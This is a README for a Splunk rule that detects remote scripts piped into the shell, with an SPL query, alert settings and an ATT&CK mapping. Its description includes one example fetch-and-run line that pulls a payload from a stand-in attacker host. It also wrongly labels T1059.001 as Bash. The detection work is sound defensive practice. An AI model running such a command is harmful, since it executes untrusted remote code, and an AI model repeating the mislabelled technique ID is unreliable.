# ⚠️ Curl to Bash Detection – MITRE T1059.001

This project detects adversary behavior that pipes remote scripts directly into the shell using `curl | bash` — a common initial access or post-exploitation technique.

---

## 🎯 MITRE ATT&CK Mapping
- **Technique**: T1059.001 – Command and Scripting Interpreter: Bash

---

## 🔍 Detection Logic (SPL)

``spl
index=* sourcetype=bash_history ("curl" OR "wget") AND "bash"

| eval user="testuser"

| eval event_type="Curl Pipe to Bash Detected"

| table _time user host event_type _raw

| sort _time


## 💡 Description
This rule identifies suspicious command usage from .bash_history where a remote payload is downloaded and executed in one step.


curl http://attacker.com/payload.sh | bash

## 📂 Files

incident-report.txt

alert-summary.txt

## ✅ Alert Status
Scheduled every 5 minutes

Trigger condition: Results > 0

Action: Logs new event into main index + sends alert email



screenshots/ – CLI + Splunk UI output
